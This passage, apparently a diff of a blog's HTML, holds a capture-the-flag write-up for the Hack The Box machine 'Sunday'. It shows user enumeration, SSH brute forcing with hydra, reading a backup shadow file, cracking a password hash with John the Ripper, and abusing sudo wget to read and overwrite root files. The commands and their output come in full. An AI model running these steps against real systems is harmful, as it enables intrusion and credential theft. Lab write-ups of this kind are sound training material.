+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  sunday curl -Ok http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
+_  sunday ./finger-user-enum.pl -t 10.10.10.76 -U /opt/SecLists/Usernames/Names/names.txt -m <span style=color:#bd93f9>50</span>
+Starting finger-user-enum v1.0 <span style=color:#ff79c6>(</span> http://pentestmonkey.net/tools/finger-user-enum <span style=color:#ff79c6>)</span>
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Worker Processes ......... <span style=color:#bd93f9>50</span>
+Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
+Target count ............. <span style=color:#bd93f9>1</span>
+Username count ........... <span style=color:#bd93f9>10163</span>
+Target TCP port .......... <span style=color:#bd93f9>79</span>
+Query timeout ............ <span style=color:#bd93f9>5</span> secs
+Relay Server ............. Not used
+
+<span style=color:#6272a4>######## Scan started at Sat Sep 19 17:43:43 2020 #########</span>
+...
+sammy@10.10.10.76: sammy                 console      &lt;Jul <span style=color:#bd93f9>31</span> 17:59&gt;..
+sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
+...
+<span style=color:#6272a4>######## Scan completed at Sat Sep 19 17:45:43 2020 #########</span>
+<span style=color:#bd93f9>14</span> results.
+
+<span style=color:#bd93f9>10163</span> queries in <span style=color:#bd93f9>120</span> seconds <span style=color:#ff79c6>(</span>84.7 queries / sec<span style=color:#ff79c6>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can now try to bruteforce with <code>hydra</code>, however it&rsquo;s gonna take ages with a large password dictionnary, so maybe we try instead to craft a small dictionary with some easy guess such as hostname and default passwords</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  sunday hydra -L users.txt -P passwords.txt ssh://10.10.10.76:22022
+</code></pre></td></tr></table>
+</div>
+</div><pre tabindex=0><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 18:45:56
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
@@ -123,39 +234,55 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 18:45:
 [22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 18:46:26
-</code></pre><p>We found sunny:sunday , however my ssh-client cannot negotiate a cypher supported by the SSH server</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  sunday ssh -p <span style=color:#bd93f9>22022</span> sunny@10.10.10.76
-</span></span><span style=display:flex><span>Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g<span style=color:#ff79c6>==</span>,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
-</span></span></code></pre></td></tr></table></div></div><p>We can force the key exchange algorithm</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  .ssh ssh -p <span style=color:#bd93f9>22022</span> -oKexAlgorithms<span style=color:#ff79c6>=</span>+diffie-hellman-group1-sha1  sunny@10.10.10.76
-</span></span><span style=display:flex><span>Password:
-</span></span><span style=display:flex><span>Last login: Sat Sep <span style=color:#bd93f9>19</span> 16:20:07 <span style=color:#bd93f9>2020</span> from 10.10.14.38
-</span></span><span style=display:flex><span>Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style=color:#bd93f9>2008</span>
-</span></span><span style=display:flex><span>sunny@sunday:~$ <span style=color:#8be9fd;font-style:italic>pwd</span>
-</span></span><span style=display:flex><span>/export/home/sunny
-</span></span><span style=display:flex><span>sunny@sunday:~$ id
-</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>65535<span style=color:#ff79c6>(</span>sunny<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>groups</span><span style=color:#ff79c6>=</span>1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>sunny@sunday:~$ sudo -l
-</span></span><span style=display:flex><span>User sunny may run the following commands on this host:
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> NOPASSWD: /root/troll
-</span></span><span style=display:flex><span>sunny@sunday:~$ sudo /root/troll
-</span></span><span style=display:flex><span>testing
-</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span>
-</span></span></code></pre></td></tr></table></div></div><p>sunny can execute /root/troll as sudo, but we can&rsquo;t do much without another attack</p><p>We can find a backup copy of the shadow file, which contains password hash for user sammy</p><pre tabindex=0><code>sunny@sunday:~$ ls /backup
+</code></pre><p>We found sunny:sunday , however my ssh-client cannot negotiate a cypher supported by the SSH server</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  sunday ssh -p <span style=color:#bd93f9>22022</span> sunny@10.10.10.76
+Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g<span style=color:#ff79c6>==</span>,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+</code></pre></td></tr></table>
+</div>
+</div><p>We can force the key exchange algorithm</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  .ssh ssh -p <span style=color:#bd93f9>22022</span> -oKexAlgorithms<span style=color:#ff79c6>=</span>+diffie-hellman-group1-sha1  sunny@10.10.10.76
+Password:
+Last login: Sat Sep <span style=color:#bd93f9>19</span> 16:20:07 <span style=color:#bd93f9>2020</span> from 10.10.14.38
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style=color:#bd93f9>2008</span>
+sunny@sunday:~$ <span style=color:#8be9fd;font-style:italic>pwd</span>
+/export/home/sunny
+sunny@sunday:~$ id
+<span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>65535<span style=color:#ff79c6>(</span>sunny<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>groups</span><span style=color:#ff79c6>=</span>1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span>
+sunny@sunday:~$ sudo -l
+User sunny may run the following commands on this host:
+    <span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> NOPASSWD: /root/troll
+sunny@sunday:~$ sudo /root/troll
+testing
+<span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>sunny can execute /root/troll as sudo, but we can&rsquo;t do much without another attack</p>
+<p>We can find a backup copy of the shadow file, which contains password hash for user sammy</p>
+<pre tabindex=0><code>sunny@sunday:~$ ls /backup
 agent22.backup  shadow.backup
 sunny@sunday:~$ cat /backup/shadow.backup
 mysql:NP:::::::
@@ -169,117 +296,271 @@ nobody4:*LK*:6445::::::
 sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
 sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 sunny@sunday:~$
-</code></pre><p>We copy for john the ripper</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  sunday <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::&#39;</span> &gt; crack.txt
-</span></span><span style=display:flex><span>_  sunday /opt/john/run/john --wordlist<span style=color:#ff79c6>=</span>/opt/dictionaries/rockyou.txt crack.txt
-</span></span><span style=display:flex><span>Using default input encoding: UTF-8
-</span></span><span style=display:flex><span>Loaded <span style=color:#bd93f9>1</span> password <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>(</span>sha256crypt, crypt<span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>$5</span>$ <span style=color:#ff79c6>[</span>SHA256 128/128 AVX 4x<span style=color:#ff79c6>])</span>
-</span></span><span style=display:flex><span>Cost <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>(</span>iteration count<span style=color:#ff79c6>)</span> is <span style=color:#bd93f9>5000</span> <span style=color:#ff79c6>for</span> all loaded hashes
-</span></span><span style=display:flex><span>Will run <span style=color:#bd93f9>4</span> OpenMP threads
-</span></span><span style=display:flex><span>Press <span style=color:#f1fa8c>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#ff79c6>for</span> status
-</span></span><span style=display:flex><span>cooldude!        <span style=color:#ff79c6>(</span>sammy<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>1g 0:00:00:44 DONE <span style=color:#ff79c6>(</span>2020-09-19 19:00<span style=color:#ff79c6>)</span> 0.02269g/s 4624p/s 4624c/s 4624C/s dominique15..chronic69
-</span></span><span style=display:flex><span>Use the <span style=color:#f1fa8c>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-</span></span><span style=display:flex><span>Session completed.
-</span></span></code></pre></td></tr></table></div></div><p>sammy:cooldude!</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  .ssh ssh -p <span style=color:#bd93f9>22022</span> -oKexAlgorithms<span style=color:#ff79c6>=</span>+diffie-hellman-group1-sha1  sammy@10.10.10.76
-</span></span><span style=display:flex><span>Password:
-</span></span><span style=display:flex><span>Last login: Sat Sep <span style=color:#bd93f9>19</span> 16:34:56 <span style=color:#bd93f9>2020</span> from 10.10.14.38
-</span></span><span style=display:flex><span>Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style=color:#bd93f9>2008</span>
-</span></span><span style=display:flex><span>sammy@sunday:~$ ls
-</span></span><span style=display:flex><span>Desktop  Documents  Downloads  Public
-</span></span><span style=display:flex><span>sammy@sunday:~$ <span style=color:#8be9fd;font-style:italic>cd</span> Deskto
-</span></span><span style=display:flex><span>sammy@sunday:~$ ls Desktop
-</span></span><span style=display:flex><span>user.txt
-</span></span><span style=display:flex><span>sammy@sunday:~$ cat Desktop/user.txt
-</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>
-</span></span></code></pre></td></tr></table></div></div><h1 id=root-flag-without-privilege-escalation>root flag without privilege escalation</h1><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sammy@sunday:~$ sudo -l
-</span></span><span style=display:flex><span>User sammy may run the following commands on this host:
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> NOPASSWD: /usr/bin/wget
-</span></span></code></pre></td></tr></table></div></div><p>As we know which file we are looking for, The easiest way to get the root flag is:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sammy@sunday:~$ sudo wget -i /root/root.txt
-</span></span><span style=display:flex><span>//root/root.txt: Invalid URL <span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>: Unsupported scheme
-</span></span><span style=display:flex><span>No URLs found in /root/root.txt.
-</span></span></code></pre></td></tr></table></div></div><h1 id=privilege-escalation>privilege escalation</h1><p>The attack path is:</p><ol><li>sunny is allowed to execute dummy /root/troll with sudo</li><li>if we can overwrite /root/troll to get a shell, then we can become root</li><li>sammy has the ability to download as root with sudo</li><li>Then sammy can overwrite /root/troll with <code>sudo wget http://... -O /root/troll</code></li><li>in fact sunny will execute a crafted script that sammy will wget to overwrite /root/troll</li><li>the crafted script will open a shell as root</li></ol><p>We can craft a script, and prepare the http server for the upload</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ctf@014202efa8c8:~/htb/sunday/http$ mkdir http  <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#8be9fd;font-style:italic>cd</span> http
-</span></span><span style=display:flex><span>ctf@014202efa8c8:~/htb/sunday/http$ cat <span style=color:#f1fa8c>&lt;&lt; EOF &gt; crafted.sh
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&gt; #!/bin/bash
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&gt; /bin/bash
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&gt; EOF</span>
-</span></span><span style=display:flex><span>ctf@014202efa8c8:~/htb/sunday/http$ cat crafted.sh
-</span></span><span style=display:flex><span><span style=color:#6272a4>#!/bin/bash</span>
-</span></span><span style=display:flex><span>/bin/bash
-</span></span><span style=display:flex><span>ctf@014202efa8c8:~/htb/sunday/http$ sudo python3 -m http.server <span style=color:#bd93f9>80</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>sudo<span style=color:#ff79c6>]</span> password <span style=color:#ff79c6>for</span> ctf:
-</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#bd93f9>80</span> <span style=color:#ff79c6>(</span>http://0.0.0.0:80/<span style=color:#ff79c6>)</span> ...
-</span></span></code></pre></td></tr></table></div></div><p>| We have to be very fast because the /root/troll is restored every seconds</p><p>As user sammy:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
